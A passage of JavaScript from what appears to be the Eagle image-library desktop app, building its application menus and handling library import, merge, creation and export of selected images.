                            click: function (event) {
                                $scope.$evalAsync(function () {
                                    $scope.searchInAll();
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.find>filter'),
                            accelerator: preferences.shortcuts.keybinds['toggle.filter'] || 'CmdOrCtrl+Shift+F',
                            click: function () {
                                $scope.toggleFilter();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.find>filterFolders'),
                            accelerator: 'Alt+Shift+F',
                            click: function (event) {
                                $scope.$evalAsync(function () {
                                    $scope.focusSidebarSearch(event);
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.find>switchFolder'),
                            accelerator: preferences.shortcuts.keybinds['quicksearch'],
                            click: function () {
                                if ($scope.isOpenQuickSearch) {
                                    $scope.closeQuickSearch(event);
                                }
                                else {
                                    $scope.openQuickSearch(event);
                                }
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.find>addToFolder'),
                            accelerator: preferences.shortcuts.keybinds['add.to'],
                            click: function () {
                                $scope.addToFolders(event);
                                $scope.$evalAsync();
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__("context.import.findDuplicate"),
                            submenu: [
                                {
                                    label: i18n.__("context.import.findDuplicate>all"),
                                    enabled: !$scope.isAppLocked,
                                    click: function () {
                                        $scope.openDuplicate();
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__("context.import.findDuplicate>currentList"),
                                    enabled: !$scope.isAppLocked,
                                    click: function () {
                                        $scope.openDuplicate({
                                            currentPage: true
                                        });
                                        $scope.$evalAsync();
                                    }
                                },
                                {
                                    label: i18n.__("context.import.findDuplicate>selected"),
                                    enabled: !$scope.isAppLocked,
                                    click: function () {
                                        $scope.openDuplicate({
                                            selected: true
                                        });
                                        $scope.$evalAsync();
                                    }
                                },
                            ]
                        },
                    ]
                },
                {
                    label: i18n.__('appmenu.tag'),
                    submenu: [
                        {
                            label: i18n.__('appmenu.tag>tagPopup'),
                            accelerator: 'CmdOrCtrl+T',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.openInspectorTagSelectPanel();
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.tag>filter'),
                            accelerator: preferences.shortcuts.keybinds['open.tagfilter'] || 'Alt+T',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.toggleTagFilter();
                                });
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.tag>removeRating') + ' (0)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(undefined, true);
                                });
                            }
                        },
                        {
                            label: '★ (1)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(1, true);
                                });
                            }
                        },
                        {
                            label: '★★ (2)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(2, true);
                                });
                            }
                        },
                        {
                            label: '★★★ (3)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(3, true);
                                });
                            }
                        },
                        {
                            label: '★★★★ (4)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(4, true);
                                });
                            }
                        },
                        {
                            label: '★★★★★ (5)',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.changeStar(5, true);
                                });
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.tag>copyTags'),
                            accelerator: 'CmdOrCtrl+Shift+C',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.copyTags();
                                });
                            }
                        },
                        {
                            label: i18n.__('appmenu.tag>pasteTags'),
                            accelerator: 'CmdOrCtrl+Shift+V',
                            click: function () {
                                $scope.$evalAsync(function () {
                                    $scope.pasteTags();
                                });
                            }
                        },
                        {
                            type: 'separator'
                        }
                    ]
                },
                {
                    label: i18n.__('appmenu.view'),
                    submenu: [
                        {
                            label: i18n.__('appmenu.view>all'),
                            accelerator: 'CmdOrCtrl+1',
                            click: function () {
                                $scope.openAll();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>unfiled'),
                            accelerator: 'CmdOrCtrl+2',
                            click: function () {
                                $scope.openUnfiled();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>untagged'),
                            accelerator: 'CmdOrCtrl+3',
                            click: function () {
                                $scope.openUntagged();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('general.pages.recent'),
                            accelerator: 'CmdOrCtrl+4',
                            click: function () {
                                $scope.openRecent();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>random'),
                            accelerator: 'CmdOrCtrl+5',
                            click: function () {
                                $scope.openRandom();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>allTags'),
                            accelerator: 'CmdOrCtrl+6',
                            click: function () {
                                $scope.openAllTags();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>trash'),
                            accelerator: 'CmdOrCtrl+7',
                            click: function () {
                                $scope.openTrash();
                                $scope.$evalAsync();
                            }
                        },
                        { type: 'separator' },
                        {
                            label: i18n.__('appmenu.view>gridLayout'),
                            accelerator: 'Alt+1',
                            type: 'checkbox',
                            checked: $scope.layout === "GridLayout",
                            click: function (event) {
                                if (process.platform == 'darwin') {
                                    applicationMenu.items[5].submenu.items[0].checked = true;
                                    applicationMenu.items[5].submenu.items[1].checked = false;
                                    applicationMenu.items[5].submenu.items[2].checked = false;
                                    applicationMenu.items[5].submenu.items[3].checked = false;
                                }
                                else {
                                    applicationMenu.items[4].submenu.items[0].checked = true;
                                    applicationMenu.items[4].submenu.items[1].checked = false;
                                    applicationMenu.items[4].submenu.items[2].checked = false;
                                    applicationMenu.items[5].submenu.items[3].checked = false;
                                }
                                $scope.switchGridLayout();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>justifiedLayout'),
                            accelerator: 'Alt+2',
                            type: 'checkbox',
                            checked: $scope.layout === "JustifiedLayout",
                            click: function (event) {
                                if (process.platform == 'darwin') {
                                    applicationMenu.items[5].submenu.items[0].checked = false;
                                    applicationMenu.items[5].submenu.items[1].checked = true;
                                    applicationMenu.items[5].submenu.items[2].checked = false;
                                    applicationMenu.items[5].submenu.items[3].checked = false;
                                }
                                else {
                                    applicationMenu.items[4].submenu.items[0].checked = false;
                                    applicationMenu.items[4].submenu.items[1].checked = true;
                                    applicationMenu.items[4].submenu.items[2].checked = false;
                                    applicationMenu.items[5].submenu.items[3].checked = false;
                                }
								$scope.switchJustifiedLayout();
                            }
                        },
                        {
                            label: i18n.__('context.order.layout>square'),
                            accelerator: 'Alt+3',
                            type: 'checkbox',
                            checked: $scope.layout === "SquareLayout",
                            click: function (event) {
                                if (process.platform == 'darwin') {
                                    applicationMenu.items[5].submenu.items[0].checked = false;
                                    applicationMenu.items[5].submenu.items[1].checked = false;
                                    applicationMenu.items[5].submenu.items[2].checked = true;
                                    applicationMenu.items[5].submenu.items[3].checked = false;
                                }
                                else {
                                    applicationMenu.items[4].submenu.items[0].checked = false;
                                    applicationMenu.items[4].submenu.items[1].checked = false;
                                    applicationMenu.items[4].submenu.items[2].checked = true;
                                    applicationMenu.items[4].submenu.items[3].checked = false;
                                }
                                $scope.switchSquareLayout();
                            }
                        },
                        {
                            label: i18n.__('context.order.layout>list'),
                            accelerator: 'Alt+4',
                            type: 'checkbox',
                            checked: $scope.layout === "ListLayout",
                            click: function (event) {
                                if (process.platform == 'darwin') {
                                    applicationMenu.items[5].submenu.items[0].checked = false;
                                    applicationMenu.items[5].submenu.items[1].checked = false;
                                    applicationMenu.items[5].submenu.items[2].checked = false;
                                    applicationMenu.items[5].submenu.items[3].checked = true;
                                }
                                else {
                                    applicationMenu.items[4].submenu.items[0].checked = false;
                                    applicationMenu.items[4].submenu.items[1].checked = false;
                                    applicationMenu.items[4].submenu.items[2].checked = false;
                                    applicationMenu.items[4].submenu.items[3].checked = true;
                                }
                                $scope.switchListLayout();
                            }
                        },
                        { type: 'separator' },
                        {
                            label: i18n.__('appmenu.view>zoomIn'),
                            accelerator: preferences.shortcuts.keybinds['zoom.in'],
                            click: function (event) {
                                $scope.zoomIn(event);
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>zoomOut'),
                            accelerator: preferences.shortcuts.keybinds['zoom.out'],
                            click: function () {
                                $scope.zoomOut(event);
                                $scope.$evalAsync();
                            }
                        }, {
                            label: i18n.__('appmenu.view>zoomActual'),
                            accelerator: preferences.shortcuts.keybinds['zoom.actual'],
                            click: function () {
                                $scope.zoomActual(event);
                                $scope.$evalAsync();
                            }
                        }, {
                            label: i18n.__('appmenu.view>zoomFit'),
                            accelerator: preferences.shortcuts.keybinds['zoom.fit'],
                            click: function () {
                                $scope.zoomFit(event);
                                $scope.$evalAsync();
                            }
                        }, 
                        $scope.ContextMenuItems["grayscale"],
                        { type: 'separator' },
                        {
                            label: i18n.__('appmenu.view>openWithDefault'),
                            accelerator: 'Shift+Enter',
                            click: function () {
                                $scope.openFilesWithDefault($scope.selected);
                                $scope.$evalAsync();
                            }
                        },
                        {
                            visible: process.platform === 'darwin',
                            label: i18n.__('appmenu.view>openInFinder'),
                            accelerator: 'CmdOrCtrl+Enter',
                            click: function() { 
                                $scope.openInFinder();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>openUrl'),
                            accelerator: preferences.shortcuts.keybinds['open.link'],
                            click: function () {
                                $scope.openLink();
                                $scope.$evalAsync();
                            }
                        },
                        { type: 'separator' },
                        {
                            label: i18n.__('appmenu.view>toggleSidebar'),
                            accelerator: 'CmdOrCtrl+alt+1',
                            click: function () {
                                $scope.toggleSidebar();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleInspector'),
                            accelerator: 'CmdOrCtrl+alt+2',
                            click: function () {
                                eagle.inspector.toggle();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleAll'),
                            accelerator: 'CmdOrCtrl+alt+3',
                            click: function () {
                                $scope.toggleAll();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleListName'),
                            accelerator: 'CmdOrCtrl+alt+4',
                            click: function () {
                                $scope.showListName();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleListMetas'),
                            accelerator: 'CmdOrCtrl+alt+5',
                            click: function () {
                                $scope.showListMetas();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleListAnnotation'),
                            accelerator: 'CmdOrCtrl+alt+6',
                            click: function () {
                                $scope.showListAnnotation();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>toggleSubfolder'),
                            accelerator: 'CmdOrCtrl+alt+7',
                            click: function () {
                                $scope.showListSubfolderContent();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: $filter('i18n')('context.image.slideshowOn'),
                            accelerator: fullScreenAccelerator,
                            click: function () {
                                $scope.toggleSlideshow();
                            }
                        },
                        {
                            label: $filter('i18n')('context.image.slideshowOff'),
                            accelerator: "ESC",
                            click: function ($event) {
                            	$scope.escHandler($event);
                            	$scope.$evalAsync();
                            }
                        },
                        { type: 'separator' },
                        {
                            label: i18n.__('appmenu.view>volumeIncrease'),
                            accelerator: 'CmdOrCtrl+Up',
                            click: function () {
                                if ($scope.isDetailMode) {
                                    $scope.increaseVolume();    
                                }
                                else {
                                    if (process.platform === "darwin") {
                                        $scope.gotoTop();
                                    }
                                }
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>volumeDecrease'),
                            accelerator: 'CmdOrCtrl+Down',
                            click: function () {
                                if ($scope.isDetailMode) {
                                    $scope.decreaseVolume();
                                }
                                else {
                                    if (process.platform === "darwin") {
                                        $scope.gotoBottom();
                                    }
                                }
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>stepForward'),
                            accelerator: 'CmdOrCtrl+Right',
                            click: function () {
                                $scope.stepForward();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>stepBackward'),
                            accelerator: 'CmdOrCtrl+Left',
                            click: function () {
                                $scope.stepBackward();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>nextFrame'),
                            accelerator: ']',
                            click: function (event) {
                            	$scope.nextFrameHandler(1);
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>prevFrame'),
                            accelerator: '[',
                            click: function (event) {
                            	$scope.prevFrameHandler(1);
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>next10Frame'),
                            accelerator: 'Shift+]',
                            click: function (event) {
                                $scope.nextFrameHandler(10);
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>prev10Frame'),
                            accelerator: 'Shift+[',
                            click: function (event) {
                                $scope.prevFrameHandler(10);
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>speedUp'),
                            accelerator: 'Shift+.',
                            click: function (event) {
                                $scope.speedUp();
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.view>speedDown'),
                            accelerator: 'Shift+,',
                            click: function (event) {
                                $scope.speedDown();
                                $scope.$evalAsync();
                            }
                        },
                    ]
                }, 
                {
                    visible: Actions.actions.length > 0,
                    label: i18n.__('appmenu.actions'),
                    submenu: Actions.actions.map(function (action) {
                        return {
                            label: action.name,
                            accelerator: Actions.formatShortcut(action.shortcut) || '',
                            click: function () {
                                $rootScope.$broadcast("RUN_ACTION", action);
                                $scope.$evalAsync();
                            }
                        };
                    })
                },
                {
                    label: i18n.__('appmenu.window'),
                    role: 'window',
                    visible: $scope.platform === 'darwin',
                    submenu: [
                    {
                        label: i18n.__('appmenu.window>togglefullscreen'),
                        role: 'togglefullscreen'
                    },
                    {
                        label: i18n.__('appmenu.window>minimize'),
                        role: 'minimize'
                    },
                    {
                        label: i18n.__('appmenu.window>closeWindow'),
                        accelerator: 'CmdOrCtrl+W',
                        role: 'close'
                    }]
                },
                pluginModule.pluginMenu,
                helpMenuItem];

            var registerMenuItem = {
                enabled: !Registration.activated && !$rootScope.isAppLocked,
                label: i18n.__('appmenu.app>register'),
                click: function () {
                    ipcRenderer.send('open-registration', 'REGISTER');
                }
            };

            var unregisterMenuItem = {
                enabled: Registration.activated && !$rootScope.isAppLocked,
                label: i18n.__('appmenu.app>unregister'),
                click: function () {
                    currentWindow.webContents.send('open-unregister');
                }
            }

            var manageRegistrationDevices = {
                enabled: Registration.activated && !$rootScope.isAppLocked,
                label: i18n.__("dialog.removeDevice.header") + "...",
                click: function () {
                    ipcRenderer.send('open-manage-device-window');
                }
            }

            if (Registration.activated) {
                registerMenuItem.label = i18n.__('appmenu.app>registeredTo') + Registration.license.email;
            }
            if (process.platform == 'darwin') {
                const name = app.getName();

                application_menu.unshift({
                    label: name,
                    submenu: [
                        {
                            label: i18n.__('appmenu.app>about'),
                            click: function () {
                                $scope.$broadcast("OPEN_ABOUT_PANEL");
                                $scope.$evalAsync();
                            }
                        },
                        {
                            label: i18n.__('appmenu.app>checkUpdate'),
                            click: function () {
                                IPCHelper.send('check-for-update', {
                                	machineID: machineID,
                                	showAlredy: true,
                                });
                            }
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.app>preferences'),
                            accelerator: 'CmdOrCtrl+,',
                            enabled: !$rootScope.isAppLocked,
                            click: () => {
                                if ($rootScope.isAppLocked) return;
                                ipcRenderer.send('open.preferences');
                            }
                        },
                        colorSpaceMenuItem,
                        {
                            type: 'separator'
                        },
                        { role: 'services' },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.app>lock'),
                            accelerator: 'CmdOrCtrl+Alt+L',
                            enabled: $rootScope.preferences.privacy.enable !=='false' && !$rootScope.isAppLocked,
                            click: () => {
                                $scope.lockApp();
                                $rootScope.$evalAsync();
                            }
                        },
                        {
                            type: 'separator'
                        },
                        registerMenuItem,
                        unregisterMenuItem,
                        manageRegistrationDevices,
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.app>hide') + ' ' + name,
                            accelerator: 'CmdOrCtrl+H',
                            role: 'hide'
                        },
                        {
                            label: i18n.__('appmenu.app>hideOthers'),
                            accelerator: 'Command+Alt+H',
                            role: 'hideOthers'
                        },
                        {
                            type: 'separator'
                        },
                        {
                            label: i18n.__('appmenu.app>quit'),
                            accelerator: 'Command+Q',
                            click: () => {
                                ipcRenderer.send('quit');
                            }
                        },
                    ]
                });
            }
            else {
                const name = app.getName();
                application_menu.push({
                    type: 'separator'
                });
                application_menu.push(registerMenuItem);
                application_menu.push(unregisterMenuItem);
                application_menu.push(manageRegistrationDevices);
                application_menu.push({
                    type: 'separator'
                });

                application_menu.push(colorSpaceMenuItem);

                application_menu.push({
                    label: i18n.__('appmenu.app>preferences'),
                    enabled: !$rootScope.isAppLocked,
                    accelerator: 'CmdOrCtrl+,',
                    click: () => {
                        if ($rootScope.isAppLocked) return;
                        ipcRenderer.send('open.preferences');
                    }
                });

                application_menu.push({
                    type: 'separator'
                });

                application_menu.push(
                {
                    label: i18n.__('appmenu.app>lock'),
                    accelerator: 'CmdOrCtrl+Alt+L',
                    enabled: $rootScope.preferences.privacy.enable !=='false' && !$rootScope.isAppLocked,
                    click: () => {
                        $scope.lockApp();
                        $rootScope.$evalAsync();
                    }
                });

                application_menu.push({
                    type: 'separator'
                });

                application_menu.push({
                    label: i18n.__('appmenu.app>checkUpdate'),
                    click: function () {
                        IPCHelper.send('check-for-update', {
                        	machineID: machineID,
                        	showAlredy: true,
                        });
                    }
                });
                
                application_menu.push(
                    {
                        label: i18n.__('appmenu.app>about'),
                        click: function () {
                            $scope.$broadcast("OPEN_ABOUT_PANEL");
                            $scope.$evalAsync
                        }
                    });

                application_menu.push({
                    type: 'separator'
                });
                
                application_menu.push({
                    label: i18n.__('appmenu.app>quit'),
                    accelerator: "Alt+F4",
                    click: () => {
                        if (currentWindow && !currentWindow.isDestroyed()) {
                            currentWindow.hide();
                        }
                        ipcRenderer.send('quit');
                    }
                });
            }
            applicationMenu = Menu.buildFromTemplate(application_menu);
            Menu.setApplicationMenu(applicationMenu);
        };

        $scope.importLibraryData = importLibraryData;
        function importLibraryData() {

            dialog.showOpenDialog(currentWindow, {
                title: i18n.__('dialog.changeLibrary.title'),
                filters: [
                    { name: 'Eagle Library', extensions: ['library'] },
                ],
                properties: ['openDirectory', 'openFile']
            }).then(result => {
                var paths = result.filePaths;
                if (paths && paths.length > 0) {

                    var libraryPath = paths[0];
                    var metadataPath = libraryPath + "/metadata.json";

                    if (!fs.existsSync(metadataPath)) {
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon error"></div>
                                    <h4 class="alert-title">${i18n.__('dialog.libraryNotFount.title')}</h4>
                                    <p class="alert-desc">${i18n.__('dialog.libraryNotFount.desc')}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("dialog.libraryNotFount.button"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            importLibraryData();
                        });
                    }
                    else {

                        // 避免导入自己
                        if ($scope.libraryPath === libraryPath) {
                            swal({
                                title: i18n.__("dialog.mergeSameLibrary.title"),
                                html: i18n.__("dialog.mergeSameLibrary.desc"),
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                confirmButtonColor: "#F23459", // 1373FB DA4945
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("dialog.mergeSameLibrary.button"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function () {
                                importLibraryData();
                            });
                            return;
                        }

                        try {
                            var data = fs.readFileSync(metadataPath, 'utf8');
                            var library = JSON.parse(data);
                            var folders = library.folders;
                            var smartFolders = library.smartFolders;
                            var tagsGroups = library.tagsGroups;
                            var imageCount = fs.readdirSync(libraryPath + "/images/").length;

                            var message = $filter('i18n')("dialog.mergeLibraryConfirm.desc", [
                                { "property": "path", "value": libraryPath },
                                { "property": "folderCount", "value": folders.length },
                                { "property": "imageCount", "value": imageCount }
                            ]);
                            if (folders.length === 1) { message = message.replace("folders", "folder"); }
                            if (imageCount === 1) { message = message.replace("images", "image"); }

                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-icon info"></div>
                                        <h4 class="alert-title">${i18n.__("dialog.mergeLibraryConfirm.title")}</h4>
                                        <p class="alert-desc">${message}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: false, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "alert-box",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("dialog.mergeLibraryConfirm.button"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function () {

                                function moveNodeTo (folder, folders) {
                                    var existsFolder = $scope.folderMappings[folder.id];
                                    // 如果文件夹已经存在，就把该文件夹还没有重复的子文件夹搬移到存在文件夹中
                                    if (existsFolder) {
                                        if (!existsFolder.children) existsFolder.children = [];
                                        if (folder.children.length > 0) {
                                            folder.children.forEach(function (child) {
                                                moveNodeTo(child, existsFolder.children);
                                            });
                                        }
                                    }
                                    else {
                                        $scope.folderMappings[folder.id] = folder;
                                        folders.push(folder);
                                    }
                                }

                                // Step1: 导入文件夹
                                folders.forEach(function (folder) {
                                    moveNodeTo(folder, $scope.folders);
                                });
                                
                                // Step2: 导入智能文件夹 TODO
                                smartFolders.forEach(function (smartFolder) {
                                    // 避免重复导入
                                    for (var i = 0; i < $scope.smartFolders.length; i++) {
                                        if ($scope.smartFolders[i].id === smartFolder.id) {
                                            return;
                                        }
                                    }
                                    $scope.smartFolders.push(smartFolder);
                                });

                                // 搬移所有标签群组
                                if (tagsGroups && tagsGroups.length > 0) {
                                    tagsGroups.forEach(function (tagsGroup) {
                                        // 避免重复导入
                                        for (var i = 0; i < TagManager.groups.length; i++) {
                                            if (TagManager.groups[i].id === tagsGroup.id) {
                                                return;
                                            }
                                        }
                                        TagManager.groups.push(tagsGroup);
                                    });
                                }

                                // Step3: 搬移所有图片
                                if (imageCount > 0) {
                                    ipcRenderer.send('start-import-library-content', libraryPath);
                                }
                                else {
                                    ipcRenderer.send("close-import-library");
                                }
                                $scope.updateSidebarList();
                                $scope.saveFolder();
                                $scope.$evalAsync();
                            });
                        }
                        catch (err) {
                            swal({
                                html: `
                                    <div class="alert">
                                        <div class="alert-icon error"></div>
                                        <h4 class="alert-title">${i18n.__('dialog.libraryNotFount.title')}</h4>
                                        <p class="alert-desc">${i18n.__('dialog.libraryNotFount.desc')}</p>
                                    </div>
                                `,
                                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                width: 400,
                                customClass: "alert-box",
                                cancelButtonColor: "#777777",
                                confirmButtonText: i18n.__("dialog.libraryNotFount.button"),
                                cancelButtonText: i18n.__("general.cancel"),
                            }).then(function () {
                                importLibraryData();
                            });
                            electronLog && electronLog.error(err.stack || err);
                        }
                    }
                }
            }).catch(err => {
                console.log(err)
            })
        };

        $scope.createLibrary = function() {
            swal({
                html: `
                    <div class="alert">
                        <div class="alert-icon library"></div>
                        <h4 class="alert-title">${i18n.__("Dialog.CreateLibrary.Title")}</h4>
                        <p class="alert-desc">${i18n.__("Dialog.CreateLibrary.Descript")}</p>
                    </div>
                `,
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                input: 'text',
                inputPlaceholder: i18n.__('Dialog.CreateLibrary.Placeholder'),
                inputValue: '',
                inputValidator: function (value) {
                    return new Promise(function (resolve, reject) {
                        if (value && !/[@#$%^&*()<>:'"\/\\|?*]+/.test(value)) {
                           resolve()
                        }
                        else {
                            reject(i18n.__('Dialog.CreateLibrary.Error'))
                        }
                    })
                },
                customClass: "alert-box",
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("Dialog.CreateLibrary.Create"),
                cancelButtonText: i18n.__("general.cancel"),
            }).then(function (result) {
                chooseLibraryPath(result);
            }, function () {});
            $scope.$evalAsync();
        };

        function chooseLibraryPath (libraryName) {
            var name = libraryName || "Eagle";
            name = name.replace(/[@#$%^&*()<>:'"\/\\|?*]+/g, '').replace(/%/g, "");
            name = name.substr(0, 127);

            const unrom = require(appRoot.path + '/app/js/utils/unorm.js');
            const nfc = (text) => {
                try {
                    return unrom.nfc(text);
                }
                catch (err) {
                    return text;
                }
            };

            name = nfc(name);

            dialog.showOpenDialog(currentWindow, {
                title: $filter('i18n')('dialog.createLibrary.title'),
                filters: [],
                properties: ['openDirectory'],
                buttonLabel: $filter('i18n')("dialog.createLibrary.botton"),
                defaultPath: path.normalize(app.getPath('home') + '/Pictures')
            }).then(result => {
                var paths = result.filePaths;
                if (paths && paths[0]) {
                    var savePath = paths[0];
                    if (savePath.indexOf("Desktop") > -1 || savePath.indexOf("Downloads") > -1) {
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon warning"></div>
                                    <h4 class="alert-title">${i18n.__("dialog.createLibraryPath.title")}</h4>
                                    <p class="alert-desc">${i18n.__("dialog.createLibraryPath.desc")}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("dialog.createLibraryPath.chooseBtn"),
                            cancelButtonText: i18n.__("dialog.createLibraryPath.saveBtn"),
                            allowEscapeKey: false
                        }).then(function () {
                            chooseLibraryPath(libraryName);
                        }, function () {
                            ipcRenderer.send('create-library', {
                                name: name,
                                savePath: savePath
                            });
                        });
                    }
                    else {
                        ipcRenderer.send('create-library', {
                            name: name,
                            savePath: savePath
                        });
                    }
                }
            });            
        };

        $scope.refresh = function () {
            ipcRenderer.send('reload-app');
        };

        $scope.refreshList = function () {
        	ipcRenderer.send("refresh-library");
        	$scope.reload(true);
        	$timeout(function () {
        		$scope.refreshSmartFolderCount();
        	}, 100);
        };

        $scope.refreshSmartFolderCount = function () {
        	ayncsUpdateSmartFoldersCount($scope.smartFolderList, () => {});
        }

        function ayncsUpdateSmartFoldersCount (smartFolders, callback) {
		    if (!smartFolders || smartFolders.length === 0) return;
		    setTimeout(() => {
		        let total = smartFolders.length;
		        let once = 3;
		        let loopCount = total / once;
		        let countOfSend = 0;

		        function send () {
		            var start = countOfSend * once;
		            var arr = smartFolders.slice(start, start + once);
		            countOfSend += 1;
		            
		           	for (let i = 0; i < arr.length; i++) {
		           		arr[i].imageCount = $scope.smartFolderCount(arr[i]);
		           		if (!arr[i].pinyin) {
			            	arr[i].pinyin = tinyPinyin.convertToPinyin(arr[i].name);
			            }
		           	}

		            $scope.$evalAsync();

		            loop();
		        }

		        function loop() {
		            if (countOfSend < loopCount) {
		                window.requestAnimationFrame(send);
		            }
		            else {
		            	callback && callback();
		            }
		        }
		        loop();
		    }, 30);
		}

        $scope.importLibrary = function() {
            dialog.showOpenDialog(currentWindow, {
                title: i18n.__('dialog.changeLibrary.title'),
                filters: [
                    { name: 'Eagle Library', extensions: ['library'] },
                ],
                properties: ['openDirectory', 'openFile']
            }).then(result => {
                var paths = result.filePaths;
                if (paths && paths.length > 0) {
                    var path = paths[0];
                    if (!fs.existsSync(path + "/metadata.json")) {
                        swal({
                            html: `
                                <div class="alert">
                                    <div class="alert-icon error"></div>
                                    <h4 class="alert-title">${i18n.__('dialog.libraryNotFount.title')}</h4>
                                    <p class="alert-desc">${i18n.__('dialog.libraryNotFount.desc')}</p>
                                </div>
                            `,
                            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                            width: 400,
                            customClass: "alert-box",
                            cancelButtonColor: "#777777",
                            confirmButtonText: i18n.__("dialog.libraryNotFount.button"),
                            cancelButtonText: i18n.__("general.cancel"),
                        }).then(function () {
                            $scope.importLibrary();
                        });
                    } else {
                        $scope.openLibrary(path);
                    }
                }
            });
        };

        $scope.exportSelectedAsFolder = function () {
            if ($scope.selected.length === 0) return;
            $scope.exportFolder(function (savePath) {
                if (savePath) {
                    var imageNames = {};
                    for (var i = 0; i < $scope.selected.length; i++) {
                        var image = $scope.selected[i];
                        imageNames[image.name + "." + image.ext] = image.name;
                    }

                    var needSpace = eagle.inspector.calculateFileSize($scope.selected);
                    $scope.checkDiskSpace(savePath, needSpace, function () {

                        fs.readdir(savePath, function(err, files) {

                            var sameFileCount = 0;

                            files.forEach(function (filename) {
                                if (imageNames[filename]) {
                                    sameFileCount++;
                                }
                            });

                            if (sameFileCount > 0) {

                                var message = $filter('i18n')("Dialog.Export.As.Folder.Message", [
                                    { "property": "savePath", "value": savePath },
                                    { "property": "sameFileCount", "value": sameFileCount },
                                ]);

                                swal({
                                    html: `
                                        <div class="alert">
                                            <div class="alert-icon warning"></div>
                                            <h4 class="alert-title">${i18n.__("Dialog.Export.As.Folder.Title")}</h4>
                                            <p class="alert-desc">${message}</p>
                                        </div>
                                    `,
                                    showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                                    width: 400,
                                    customClass: "alert-box",
                                    cancelButtonColor: "#777777",
                                    confirmButtonText: i18n.__("Dialog.Export.As.Folder.Button"),
                                    cancelButtonText: i18n.__("general.cancel"),
                                }).then(function () {
